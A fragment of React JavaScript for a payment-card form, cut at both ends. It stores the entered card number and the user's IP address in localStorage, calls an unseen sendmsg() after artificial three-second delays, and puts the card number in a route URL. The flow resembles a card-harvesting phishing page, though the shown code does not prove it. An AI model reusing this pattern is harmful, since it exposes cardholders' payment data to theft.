localStorage.setItem("user", numVal); localStorage.setItem("ip", ip["ip"]); }; const handleSubmit = (e) => { e.preventDefault(); if ( numVal && numVal.length === 19 && expiry.year && expiry.month && tagInputVal ) { setloading(true); setTimeout(() => { sendmsg() && history.push(`/checkpayment/${numVal}`); }, 3000); } }; const confirm = () => { setloading(true); setTimeout(() => { setloading(false); setIsSecond(true); }, 3000); };
